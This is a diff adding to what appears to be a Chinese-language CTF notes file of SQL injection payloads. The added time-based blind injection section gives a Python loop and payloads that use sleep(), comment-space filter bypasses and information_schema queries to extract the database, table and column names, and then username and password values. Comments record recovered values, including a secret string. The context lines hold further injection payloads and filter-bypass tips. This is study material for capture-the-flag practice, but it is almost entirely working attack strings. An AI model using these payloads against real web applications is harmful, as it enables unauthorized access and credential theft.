@@ -75,6 +75,19 @@ admin'=(substring((select(passwd)from(user))from(-2))='d0')='1 #最后两位
 时间盲注：
 1 and if((ascii(substr((select(flag)from(flag))from(%d)))=%d), sleep(10), 1)
 
+时间盲注2：
+for i in range(1, 100):
+    flag = 1
+    for j in range(31, 128):
+# 库 week3sqli
+# payload = "/**/OR/**/IF(ASCII(SUBSTR(DATABASE(),{},1))>{},0,sleep(2))#".format(i, j)
+# 表 u5ers
+# payload = "/**/OR/**/IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(TABLE_NAME)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema/**/LIKE/**/DATABASE()),{},1))>{},0,sleep(2))#".format(i, j)
+# 列 usern@me, p@ssword
+# payload = "/**/OR/**/IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(COLUMN_NAME)/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema/**/LIKE/**/DATABASE()),{},1))>{},0,sleep(2))#".format(i, j)
+# 值 admin, sOme7hiNgseCretw4sHidd3n
+payload = "/**/OR/**/IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(`usern@me`,0x2c,`p@ssword`)/**/FROM/**/u5ers),{},1))>{},0,sleep(2))#".format(i, j)
+
 文件名注入：
 过滤：select、from双写
 回显不能出现字母 ---》 转成十进制
